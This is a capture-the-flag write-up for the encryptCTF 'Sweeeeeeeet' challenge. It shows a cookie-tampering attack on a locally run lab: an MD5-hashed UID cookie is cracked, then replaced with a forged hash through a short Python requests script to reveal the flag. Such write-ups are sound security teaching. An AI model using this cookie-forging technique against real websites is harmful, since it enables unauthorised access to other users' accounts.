## Sweeeeeeeet

First of all, we need to build the **docker container** with the following command:

```commandline
docker build -t sweeeeeeeet .
```

Then, we can start the **image** from the GUI and expose the port `8080:80`.

### Inspecting the page/requests

By inspecting the page, we don't get anything meaningful. However, inspecting the **request** that is sent to the 
server shows us that some **cookies** are involved:

```
FLAG: encryptCTF{y0u_c4nt_U53_m3}
UID: f899139df5e1059396431415e770c6dd
```

It is quite clear that the flag is not the right one, however we have been given a **User ID** in a format which 
seems like an **MD5 hash**.

By using [crackstation.net](https://crackstation.net/), we get the value of `UID`:

```
100
```

### Exploiting the logic

We need to write a **python script** that calculates the **MD5 hash** of a number, sends a request to the server 
with the hash as a **cookie** and reads the cookies of the response.

###### Note:

I could have written a **for loop** to check a **range** of numbers,
but while working on a POC I got the correct value right away.

### Python script

We can calculate a number's MD5 hash with the following code:

```python
from hashlib import md5

uid_bytes = str(0).encode("utf-8")
uid_md5 = md5(uid_bytes).hexdigest()
```

Then, we can send a request like so:

```python
from requests import get as get_request

url = "http://127.0.0.1:8080/index.php"
response = get_request(url, cookies={"UID": uid_md5})
```

And finally, we can read the response's cookies and get the value of the `FLAG` one:

```python
from urllib.parse import unquote

unquote(response.cookies.get("FLAG"))
```

Which yields us the flag:

```
encryptCTF{4lwa4y5_Ch3ck_7h3_c00ki3s}
```
